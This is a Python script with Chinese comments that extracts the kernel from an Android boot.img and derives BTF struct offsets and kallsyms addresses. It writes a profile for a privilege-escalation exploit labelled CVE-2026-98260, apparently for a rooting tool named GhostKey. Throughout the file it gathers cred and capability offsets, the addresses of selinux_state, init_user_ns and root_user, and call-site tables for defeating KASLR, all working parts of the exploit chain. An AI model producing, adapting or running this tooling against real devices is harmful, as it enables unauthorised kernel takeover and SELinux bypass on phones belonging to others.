#!/usr/bin/env python3
"""
mkprofile.py — 从 boot.img 离线生成 CVE-2026-98260 提权所需的完整内核偏移表。

背景
----
GhostKey（Again1996-bit）内置的 profile 表与 ImgToProfile.kt 里有一批 **6.6.x 时代写死**的常量，
在 6.18 内核上全部失效：

  1. uaf_plant.c collect_nth():  trace 过滤条件 `req != 0x108`
     → 0x108 是 6.6 的 sizeof(struct k_itimer)=264；6.18 是 **384 (0x180)**。
       不改这一行，trace 里永远匹配不到 k_itimer 的分配记录，任务地址泄露直接空转。
  2. ImgToProfile.kt:  `kitimer_node = 0x78`
     → 0x78 是 6.6 里 k_itimer 内 timer_list node 的偏移；6.18 是 **224 (0xe0)**。
  3. ImgToProfile.kt:  `timer_link = do_timer_create + 0xa8` / `cred_link = prepare_creds + 0x24`
     → 这两个「内核内锚点」是 6.6.118 上标定的。6.18 开了 LTO，函数被内联，
       静态偏移已经漂移（实测 do_timer_create+0xa8 是一条 LDAR 指令，不是任何调用点）。
  4. ImgToProfile.kt:  `page_offset = PAGE_OFFSET - 0x80000000`
     → 0x80000000 是 SM8750(OPPO PKJ110) 的 DRAM 起始物理地址，换机型必须重新标定。

本脚本把 1/2/4 全部改成 **BTF / 二进制实测驱动**，并把 3 需要的「调用点候选表」也一起算出来，
交给运行时的 slide_resolve 用。

用法
----
    python3 mkprofile.py boot.img                 # 输出 .conf 到当前目录
    python3 mkprofile.py boot.img -o out.conf --json out.json

产出
----
  *.conf  GhostKey 兼容的 HOCON profile（可直接导入 APK 设置页）
  *.json  给原生体用的额外数据（调用点候选表、image base 等）
"""

import argparse
import gzip
import hashlib
import io
import json
import re
import struct
import sys

# ---------------------------------------------------------------- boot.img

ANDROID_MAGIC = b"ANDROID!"
ARM64_IMAGE_MAGIC = b"ARM\x64"
LZ4_LEGACY_MAGIC = b"\x02\x21\x4c\x18"
GZIP_MAGIC = b"\x1f\x8b\x08"
PAGE_SIZE = 4096

# arm64 Image 的虚拟基址（kallsyms_relative_base）
KERNEL_IMAGE_BASE = 0xFFFFFFC080000000
# arm64 Image 中，文件偏移 0x1000 对应虚拟地址 KERNEL_IMAGE_BASE
IMAGE_TEXT_FILE_OFFSET = 0x1000


def align_up(v, a):
    return (v + a - 1) // a * a


def u16(b, o):
    return b[o] | (b[o + 1] << 8)


def u32(b, o):
    return struct.unpack_from("<I", b, o)[0]


def u64(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def boot_header_version(raw):
    """boot header 版本号：v1+ 在 offset 40，v3+ 也在 40（v0 的这个位置是 dtb_addr）。"""
    if len(raw) < 44:
        return 0
    v = u32(raw, 40)
    # v0 没有版本号；这里用 ramdisk_size 等字段无法可靠区分 v0，
    # 保守起见：offset 40 非 0 且 <= 4 视为 v1..v4，否则视为 v0。
    return v if 0 < v <= 4 else 0


def extract_kernel(raw):
    """boot.img → 未压缩的 arm64 Image。返回 (image_bytes, meta)。"""
    if raw[:8] == ANDROID_MAGIC:
        version = boot_header_version(raw)
        kernel_size = u32(raw, 8)
        if version >= 3:
            # v3/v4: kernel_size@8, ramdisk_size@12, os_version@16, header_size@20, header_version@40
            header_size = u32(raw, 20)
            start = align_up(header_size, PAGE_SIZE)
        else:
            # v0/v1/v2: page_size@36
            page_size = u32(raw, 36) or 2048
            start = align_up(2048 + 1632, page_size)
        end = start + kernel_size
        if end > len(raw):
            raise SystemExit(
                f"boot.img 里 kernel 段越界（start=0x{start:x} size={kernel_size}，文件只有 {len(raw)} 字节）")
        seg = raw[start:end]
        meta = {"header_version": version, "kernel_file_offset": start}
    elif raw[:3] == GZIP_MAGIC:
        seg = gzip.decompress(raw)
        meta = {"header_version": "gzip"}
    elif len(raw) > 64 and raw[56:60] == ARM64_IMAGE_MAGIC:
        seg = raw
        meta = {"header_version": "raw-image"}
    else:
        raise SystemExit("输入既不是 Android boot.img，也不是 arm64 Image")

    if seg[:4] == LZ4_LEGACY_MAGIC:
        seg = lz4_legacy_decompress(seg)
        meta["compression"] = "lz4-legacy"
    elif seg[:3] == GZIP_MAGIC:
        seg = gzip.decompress(seg)
        meta["compression"] = "gzip"
    else:
        meta["compression"] = "raw"
    return seg, meta


def lz4_legacy_decompress(frame):
    """LZ4 legacy 帧：magic(4) + 重复[ u32 块长 + 块数据 ]，逐块解压再拼接。"""
    out = bytearray()
    pos = 4
    while pos + 4 <= len(frame):
        blen = u32(frame, pos)
        pos += 4
        if blen <= 0:
            break
        if pos + blen > len(frame):
            blen = len(frame) - pos
        out += lz4_block_decompress(frame[pos:pos + blen])
        pos += blen
    return bytes(out)


def lz4_block_decompress(src):
    out = bytearray()
    si = 0
    while si < len(src):
        token = src[si]
        si += 1
        lit = token >> 4
        if lit == 15:
            while True:
                b = src[si]
                si += 1
                lit += b
                if b != 255:
                    break
        out += src[si:si + lit]
        si += lit
        if si >= len(src):
            break
        offset = src[si] | (src[si + 1] << 8)
        si += 2
        mlen = (token & 0x0F) + 4
        if mlen == 19:
            while True:
                b = src[si]
                si += 1
                mlen += b
                if b != 255:
                    break
        for _ in range(mlen):
            out.append(out[len(out) - offset])
    return bytes(out)


# ---------------------------------------------------------------- BTF

BTF_MAGIC = 0xEB9F


def find_btf(buf):
    """搜索 BTF 段并校验头部，取 type 区最大的那个。"""
    best, best_len = -1, 0
    idx = 0
    while True:
        i = buf.find(b"\x9f\xeb\x01\x00", idx)
        if i < 0:
            break
        idx = i + 1
        if i + 24 > len(buf):
            continue
        hdr_len, type_off, type_len, str_off, str_len = struct.unpack_from("<IIIII", buf, i + 4)
        if (hdr_len == 24 and 0 < type_len < (64 << 20) and 0 < str_len < (16 << 20)
                and i + 24 + type_len + str_len <= len(buf)
                and type_off == 0 and str_off == type_len):
            if type_len > best_len:
                best, best_len = i, type_len
    return best


class Btf:
    def __init__(self, buf, base):
        self.buf = buf
        self.base = base
        self.body = base + 24
        _, type_off, type_len, str_off, str_len = struct.unpack_from("<IIIII", buf, base + 4)
        self.str_off, self.type_len = str_off, type_len
        self.types = []
        self._parse(self.body + type_off)

    def _string(self, off):
        s = self.body + self.str_off + off
        e = self.buf.find(b"\x00", s)
        if e < 0:
            e = len(self.buf)
        return self.buf[s:e].decode("utf8", "replace")

    def _parse(self, start):
        buf, pos, end = self.buf, start, start + self.type_len
        while pos + 12 <= end:
            name_off, info, size = struct.unpack_from("<III", buf, pos)
            pos += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            kflag = (info >> 31) & 1
            members = []
            if kind in (4, 5):          # STRUCT / UNION
                for _ in range(vlen):
                    mn, _mt, mo = struct.unpack_from("<III", buf, pos)
                    pos += 12
                    bit_off = (mo & 0xFFFFFF) if kflag == 1 else mo
                    members.append((self._string(mn), bit_off))
            elif kind == 13:
                pos += 8 * vlen
            elif kind == 6:
                pos += 8 * vlen
            elif kind == 12:
                pos += 12 * vlen
            elif kind == 15:
                pos += 12 * vlen
            elif kind == 1:
                pos += 4
            elif kind == 3:
                pos += 12
            elif kind == 14:
                pos += 4
            self.types.append((self._string(name_off), kind, size, members))

    def struct(self, name):
        for t in self.types:
            if t[0] == name and t[1] == 4:
                return t
        return None

    def members(self, name):
        t = self.struct(name)
        if not t:
            return {}
        return {m[0]: m[1] // 8 for m in t[3]}

    def size(self, name):
        t = self.struct(name)
        return t[2] if t else None


# ---------------------------------------------------------------- kallsyms

def extract_kallsyms(img):
    """
    自洽闭合链提取 kallsyms：
      token_index → token_table → markers → names → num_syms → offsets → base
    与 GhostKey/KallsymsExtractor.kt 同源同算法。
    """
    cands = []
    for m in re.finditer(rb"\x00\x00[\x01-\x41]", img):
        p = m.start()
        if p & 1:
            continue
        if p + 512 > len(img):
            continue
        if u16(img, p + 510) > 4096:
            continue
        cands.append(p)

    tables = []
    for p in cands:
        prev = 0
        ok = True
        for k in range(1, 256):
            v = u16(img, p + 2 * k)
            if v - prev < 1 or v - prev > 65:
                ok = False
                break
            prev = v
        if not ok:
            continue
        t = _derive_token_table(img, p)
        if t is not None and t not in tables:
            tables.append(t)
        if len(tables) >= 3:
            break
    if not tables:
        raise SystemExit("kallsyms：找不到 token_table（内核可能被 strip 或结构不同）")

    best = None
    for table in tables:
        tokens = _read_tokens(img, table)
        token_index = table + sum(len(t) + 1 for t in tokens)
        for markers_start, markers in _markers_candidates(img, table):
            nc = _names_candidates(img, markers_start, markers)
            if not nc:
                continue
            names_start, num_pos, num_syms, mk = nc
            for off, base in _offsets_candidates(img, num_pos, num_syms, token_index):
                syms = _build_symbols(img, off, num_syms, base, tokens, names_start)
                if syms is None:
                    continue
                score = sum(1 for s in TARGET_SYMBOLS if s in syms)
                if best is None or score > best[0]:
                    best = (score, syms, base, num_syms)
                if score == len(TARGET_SYMBOLS):
                    return best[1], best[2], best[3]
    if best is None or best[0] < len(TARGET_SYMBOLS):
        raise SystemExit("kallsyms：必需符号不全，无法生成可信 profile")
    return best[1], best[2], best[3]


TARGET_SYMBOLS = ["do_timer_create", "prepare_creds", "selinux_state", "init_user_ns",
                  "root_user", "init_groups", "init_ucounts"]


def _derive_token_table(img, index_start):
    last = u16(img, index_start + 510)
    table = max(0, index_start - last - 32)
    hi = index_start - last
    while table <= hi:
        q, ok = table, True
        for k in range(256):
            if table + u16(img, index_start + 2 * k) != q:
                ok = False
                break
            e = img.find(b"\x00", q, q + 201)
            if e < 0:
                ok = False
                break
            q = e + 1
        if ok and 400 <= q - table <= 4096:
            return table
        table += 1
    return None


def _read_tokens(img, table):
    out, p = [], table
    for _ in range(256):
        e = img.find(b"\x00", p, p + 201)
        out.append(img[p:e])
        p = e + 1
    return out


def _walk_records(d, p, k):
    for _ in range(k):
        if p < 0 or p >= len(d):
            return -1
        b0 = d[p]
        if b0 & 0x80:
            if p + 1 >= len(d):
                return -1
            ln = (b0 & 0x7F) | (d[p + 1] << 7)
            p += 2
        else:
            ln = b0
            p += 1
        if ln < 1 or p + ln > len(d):
            return -1
        p += ln
    return p


def _walk_back_markers(img, end):
    p = end - 4
    vals = []
    while p >= 0:
        v = u32(img, p)
        if v == 0:
            vals.append(0)
            break
        if vals and v >= vals[-1]:
            return None
        if v > 40_000_000:
            return None
        vals.append(v)
        p -= 4
    if len(vals) < 64 or vals[-1] != 0:
        return None
    vals.reverse()
    return (end - 4 * len(vals), vals)


def _markers_candidates(img, table):
    out = []
    for pad in (0, 4, 8, 12, 16, 20, 24):
        end = table - pad
        if end < 4:
            continue
        r = _walk_back_markers(img, end)
        if r:
            out.append(r)
    if out:
        return out
    lo = max(4, table - 6 * 1024 * 1024)
    p = table - 4
    while p >= lo and len(out) < 3:
        if u32(img, p) == 0:
            v1, v2, v3 = u32(img, p + 4), u32(img, p + 8), u32(img, p + 12)
            if 256 <= v1 <= 40000 and v1 < v2 <= 80000 and v2 < v3 <= 120000:
                vals, q, prev = [], p, -1
                while q + 4 <= len(img) and len(vals) < 4096:
                    v = u32(img, q)
                    if prev >= 0 and v <= prev:
                        break
                    if v > 40_000_000:
                        break
                    vals.append(v)
                    prev = v
                    q += 4
                if len(vals) >= 64:
                    out.append((p, vals))
        p -= 4
    return out


def _names_candidates(img, markers_start, markers):
    if len(markers) < 2:
        return None
    tgt = markers[1] - markers[0]
    if tgt <= 0:
        return None
    for k in (0, 1, 2):
        m = len(markers) - k
        if m < 8:
            continue
        last = markers[m - 1]
        hi = min(len(img) - 1, markers_start - last + 64)
        lo = max(0, markers_start - last - 65536)
        start = lo
        while start <= hi:
            p = _walk_records(img, start, 256)
            if p < 0 or p - start != tgt:
                start += 1
                continue
            num_pos, num_syms = -1, 0
            for dd in (4, 8, 12, 16):
                np_ = start - dd
                if np_ < 4:
                    continue
                v = u32(img, np_)
                if not (20000 <= v <= 400000):
                    continue
                mm = (v + 255) // 256
                if mm <= len(markers) and len(markers) - mm <= 2:
                    num_pos, num_syms = np_, v
                    break
            if num_pos < 0:
                start += 1
                continue
            mk = markers[:(num_syms + 255) // 256]
            ok = True
            for i in range(len(mk) - 1):
                pp = _walk_records(img, start + mk[i], 256)
                if pp < 0 or pp != start + mk[i + 1]:
                    ok = False
                    break
            if not ok:
                start += 1
                continue
            end = _walk_records(img, start, num_syms)
            if end < 0 or end < markers_start - 8 or end > markers_start:
                start += 1
                continue
            return start, num_pos, num_syms, mk
    return None


def _offsets_candidates(img, num_pos, num_syms, token_index):
    out = []
    limit = max(0x3000000, len(img) * 2)

    def ascending(off, num):
        if off < 0 or off + 4 * num > len(img):
            return False
        last = u32(img, off)
        if last >= limit:
            return False
        for i in range(1, num):
            v = u32(img, off + 4 * i)
            if v < last or v >= limit:
                return False
            last = v
        return last > 0

    def add(off, base):
        if (base >> 40) != 0xFFFFFF:
            return
        if not ascending(off, num_syms):
            return
        if off not in [o for o, _ in out]:
            out.append((off, base))

    for pb in (8, 12, 16, 4):
        bpos = num_pos - pb
        if bpos < 8 or bpos + 8 > len(img):
            continue
        base = u64(img, bpos)
        if (base >> 40) != 0xFFFFFF:
            continue
        for pad in (0, 4, 8, 12):
            add(bpos - pad - 4 * num_syms, base)
        for pad in (0, 4, 8, 12):
            off = num_pos - pad - 4 * num_syms
            if off < 0:
                continue
            after = off + 4 * num_syms
            if after + 8 <= len(img):
                add(off, u64(img, after))
        break

    end = min(len(img), token_index + 0x40000)
    q = token_index
    while q + 4 * num_syms + 24 <= end:
        hit = None
        for pad in (0, 4, 8, 12):
            b = u64(img, q + 4 * num_syms + pad)
            if (b >> 40) == 0xFFFFFF:
                hit = b
                break
        if hit is not None:
            add(q, hit)
            if out:
                break
        q += 4

    # 兜底：全镜像扫描「恰好 num_syms 个严格非降 u32」的连续段，其后紧跟 relative_base。
    # 6.18 GKI 的 kallsyms 就是这种布局 —— offsets 段既不在 base 之前，也不在 token_index 之后。
    if not out:
        cells = len(img) // 4
        i = 0
        while i < cells:
            v = u32(img, i * 4)
            if v >= limit:
                i += 1
                continue
            j, last = i + 1, v
            while j < cells:
                w = u32(img, j * 4)
                if w < last or w >= limit:
                    break
                last = w
                j += 1
            if j - i == num_syms:
                off = i * 4
                for pad in (0, 4, 8, 12):
                    bp = off + 4 * num_syms + pad
                    if bp + 8 <= len(img) and (u64(img, bp) >> 40) == 0xFFFFFF:
                        add(off, u64(img, bp))
                        break
            i = j
    return out


def _build_symbols(img, off, num_syms, base, tokens, names_start):
    syms, amb = {}, set()
    p = names_start
    for i in range(num_syms):
        b0 = img[p]
        if b0 & 0x80:
            ln = (b0 & 0x7F) | (img[p + 1] << 7)
            p += 2
        else:
            ln = b0
            p += 1
        if ln < 1 or p + ln > len(img):
            return None
        raw = b"".join(tokens[img[p + k]] for k in range(ln))
        p += ln
        name = raw[1:].decode("ascii", "replace") if len(raw) > 1 else ""
        addr = base + u32(img, off + 4 * i)
        if name in syms:
            if syms[name] != addr:
                amb.add(name)
        else:
            syms[name] = addr
    for a in amb:
        syms.pop(a, None)
    return syms


# ---------------------------------------------------------------- 调用点候选

def bl_sites(img, lo_file, hi_file):
    """
    扫出 [lo_file, hi_file) 区间内所有 BL 指令，返回 [(file_off, target_va)]。
    VA 换算：file_off 0x1000 ↔ KERNEL_IMAGE_BASE。
    """
    out = []
    for foff in range(lo_file - (lo_file & 3), hi_file, 4):
        if foff < 0 or foff + 4 > len(img):
            continue
        w = u32(img, foff)
        if (w & 0xFC000000) != 0x94000000:
            continue
        imm = w & 0x03FFFFFF
        if imm & 0x02000000:
            imm -= 0x04000000
        va = KERNEL_IMAGE_BASE + (foff - IMAGE_TEXT_FILE_OFFSET)
        out.append((foff, va + (imm << 2)))
    return out


def candidate_sites(img, syms):
    """
    给出 do_timer_create / prepare_creds 内部的 BL 调用点候选。
    运行时用真实 trace 的 call_site 反查，命中即为该函数的分配调用点。
    """
    res = {}
    for fn in ("do_timer_create", "prepare_creds", "copy_process"):
        a = syms.get(fn)
        if a is None:
            continue
        fstart = a - KERNEL_IMAGE_BASE + IMAGE_TEXT_FILE_OFFSET
        sites = bl_sites(img, fstart, min(fstart + 0x600, len(img)))
        # 调用点 = BL 的下一条指令（tracepoint 记的是 _RET_IP_）
        call_sites, targets = [], {}
        for foff, tgt in sites:
            site_va = KERNEL_IMAGE_BASE + (foff - IMAGE_TEXT_FILE_OFFSET)
            call_sites.append(site_va + 4)
            targets[hex(site_va + 4)] = hex(tgt)
        res[fn] = {
            "func_va": a,
            "call_sites": call_sites,
            "bl_targets": targets,
        }
    return res


# ---------------------------------------------------------------- 组装

def build_profile(boot_path):
    raw = open(boot_path, "rb").read()
    boot_sha = hashlib.sha256(raw).hexdigest()
    img, meta = extract_kernel(raw)
    img_sha = hashlib.sha256(img).hexdigest()

    btf_off = find_btf(img)
    if btf_off < 0:
        raise SystemExit("内核镜像里没有 BTF，无法推导结构偏移（这个内核不适合走导入路线）")
    btf = Btf(img, btf_off)

    ts_m = btf.members("task_struct")
    cred_m = btf.members("cred")
    kit_m = btf.members("k_itimer")
    cput_m = btf.members("cpu_timer")
    task_size = btf.size("task_struct")
    cred_size = btf.size("cred")
    kit_size = btf.size("k_itimer")

    # k_itimer 内 timer_list(node) 的偏移 = k_itimer.it 的偏移 + cpu_timer.node 的偏移
    kit_node = None
    if kit_m and cput_m:
        it_off = kit_m.get("it")
        node_off = cput_m.get("node")
        if it_off is not None and node_off is not None:
            kit_node = it_off + node_off

    syms, base, num_syms = extract_kallsyms(img)
    cands = candidate_sites(img, syms)

    off = {
        "task_cred": ts_m.get("cred"),
        "task_struct_size": task_size,
        "cred_uid": cred_m.get("uid"),
        "cred_size": cred_size,
        "cred_cap_inheritable": cred_m.get("cap_inheritable"),
        "cred_cap_permitted": cred_m.get("cap_permitted"),
        "cred_cap_effective": cred_m.get("cap_effective"),
        "cred_cap_bset": cred_m.get("cap_bset"),
        "cred_cap_ambient": cred_m.get("cap_ambient"),
        "cred_security": cred_m.get("security"),
        "cred_user": cred_m.get("user"),
        "cred_user_ns": cred_m.get("user_ns"),
        "cred_ucounts": cred_m.get("ucounts"),
        "cred_groups": cred_m.get("group_info"),
        "kitimer_size": kit_size,
        "kitimer_node": kit_node,
    }
    # 内核里的地址都是 u64，超出 Long 正数范围时要写成有符号十进制（HOCON/Kotlin 侧按 Long 读）
    def s64(v):
        return v - (1 << 64) if v >= (1 << 63) else v

    off["timer_link"] = s64(syms["do_timer_create"])
    off["cred_link"] = s64(syms["prepare_creds"])
    off["selinux_link"] = s64(syms["selinux_state"])
    off["user_ns"] = s64(syms["init_user_ns"])
    off["root_user"] = s64(syms["root_user"])
    off["groups"] = s64(syms["init_groups"])
    off["ucounts"] = s64(syms["init_ucounts"])

    release = extract_release(img)
    return {
        "release": release,
        "boot_sha256": boot_sha,
        "image_sha256": img_sha,
        "image_bytes": len(img),
        "kallsyms_base": base,
        "kallsyms_num_syms": num_syms,
        "btf_offset": btf_off,
        "offsets": off,
        "candidates": cands,
        "all_symbols": syms,
        "meta": meta,
    }


def extract_release(img):
    marker = b"Linux version "
    i = img.find(marker)
    while i >= 0:
        s = i + len(marker)
        j = s
        while j < len(img):
            c = img[j]
            if c == 0 or c in (0x0D, 0x0A, 0x20):
                break
            j += 1
        if j > s and img[s] in range(0x30, 0x3A):
            return img[s:j].decode("ascii", "replace")
        i = img.find(marker, j)
    return "unknown"


def render_conf(p, page_offset=-551903297536):
    o = p["offsets"]
    lines = [
        "{",
        f'  release = "{p["release"]}"',
        '  vuln_type = "cve-2026-98260"',
        '  recommend_shizuku = 1',
        f"  page_offset = {page_offset}",
        "  offset = {",
    ]
    for k in ("task_cred", "task_struct_size", "cred_uid", "cred_size",
              "cred_cap_inheritable", "cred_cap_permitted", "cred_cap_effective",
              "cred_cap_bset", "cred_cap_ambient", "cred_security", "cred_user",
              "cred_user_ns", "cred_ucounts", "cred_groups", "kitimer_size",
              "kitimer_node", "timer_link", "cred_link", "selinux_link",
              "user_ns", "root_user", "groups", "ucounts"):
        if o.get(k) is not None:
            lines.append(f"    {k} = {o[k]}")
    lines += [
        "  }",
        f'  _source = "img:{p["meta"].get("source", "boot.img")}"',
        f'  _image_sha256 = "{p["image_sha256"]}"',
        f'  _boot_img_sha256 = "{p["boot_sha256"]}"',
        '  _notes = "BTF 驱动生成；kitimer_size/kitimer_node 已按本机 BTF 校正；'
        'page_offset 取自 vendor_boot 设备树 /memory 节点 base=0（4K 页 PAGE_OFFSET=0xffffff8000000000）；'
        '它只是兜底值，以 calibrate-b 运行时扫描结果为准"',
        "}",
    ]
    return "\n".join(lines) + "\n"


def render_json(p, page_offset=-551903297536):
    """输出 GhostKey 可直接导入的 JSON 版 profile。

    HOCON 是 JSON 的超集，GhostKey 的 HoconSupport 解析器支持引号键/嵌套/数组，
    所以标准 JSON 文档能原样导入（见 HoconSupport.kt 的 parseQuotedString / parseValue）。
    """
    import json as _json
    o = p["offsets"]
    doc = {
        "release": p["release"],
        "vuln_type": "cve-2026-98260",
        "recommend_shizuku": 1,
        "page_offset": page_offset,
        "offset": {k: o[k] for k in (
            "task_cred", "task_struct_size", "cred_uid", "cred_size",
            "cred_cap_inheritable", "cred_cap_permitted", "cred_cap_effective",
            "cred_cap_bset", "cred_cap_ambient", "cred_security", "cred_user",
            "cred_user_ns", "cred_ucounts", "cred_groups", "kitimer_size",
            "kitimer_node", "timer_link", "cred_link", "selinux_link",
            "user_ns", "root_user", "groups", "ucounts") if o.get(k) is not None},
        "_source": "img:" + p["meta"].get("source", "boot.img"),
        "_image_sha256": p["image_sha256"],
        "_boot_img_sha256": p["boot_sha256"],
        "_notes": ("BTF 驱动生成；kitimer_size/kitimer_node 已按本机 BTF 校正；"
                   "page_offset 取自 vendor_boot 的 /memory 节点 base=0（4K 页 PAGE_OFFSET=0xffffff8000000000）；"
                   "它只是兜底值，calibrate-b 运行时扫描出的结果优先"),
    }
    return _json.dumps(doc, ensure_ascii=False, indent=2) + "\n"


def main():
    ap = argparse.ArgumentParser(description="从 boot.img 生成 CVE-2026-98260 内核偏移 profile")
    ap.add_argument("boot_img")
    ap.add_argument("-o", "--out", help="输出 .conf 路径")
    ap.add_argument("--json", dest="json_out", help="输出 .json 路径（给原生体用）")
    ap.add_argument("--profile-json", dest="profile_json_out",
                    help="输出 JSON 版 profile（GhostKey 可直接导入）")
    ap.add_argument("--kallsyms", dest="kallsyms_out",
                    help="输出 kallsyms 文本（未重定位 VA），原生体用它解 KASLR slide")
    ap.add_argument("--page-offset", type=lambda s: int(s, 0), default=-551903297536,
                    help="profile 里的 page_offset（默认 0xffffff7f80000000，即 SM8750 的假设值）")
    args = ap.parse_args()

    p = build_profile(args.boot_img)
    p["meta"]["source"] = args.boot_img.split("/")[-1]

    conf_path = args.out or (p["release"] + ".conf")
    open(conf_path, "w").write(render_conf(p, args.page_offset))
    print(f"[+] release      : {p['release']}")
    print(f"[+] kernel sha256: {p['image_sha256']}")
    print(f"[+] BTF @0x{p['btf_offset']:x}   kallsyms base=0x{p['kallsyms_base']:x} "
          f"syms={p['kallsyms_num_syms']}")
    print(f"[+] sizeof(k_itimer)={p['offsets']['kitimer_size']} "
          f"kitimer_node=0x{p['offsets']['kitimer_node']:x} "
          f"sizeof(cred)={p['offsets']['cred_size']}")
    print(f"[+] wrote {conf_path}")
    if args.json_out:
        json.dump(p, open(args.json_out, "w"), indent=2)
        print(f"[+] wrote {args.json_out}")
    if args.profile_json_out:
        open(args.profile_json_out, "w").write(render_json(p, args.page_offset))
        print(f"[+] wrote {args.profile_json_out}")
    if args.kallsyms_out:
        # 原生体（slide_resolve）需要「函数名 → 未重定位 VA」的映射，
        # 形如 "0xffffffc08021104c do_timer_create"，按 VA 升序。
        with open(args.kallsyms_out, "w") as f:
            for name, va in sorted(p["all_symbols"].items(), key=lambda kv: kv[1]):
                f.write("0x%x %s\n" % (va, name))
        print(f"[+] wrote {args.kallsyms_out} ({len(p['all_symbols'])} symbols)")


if __name__ == "__main__":
    main()
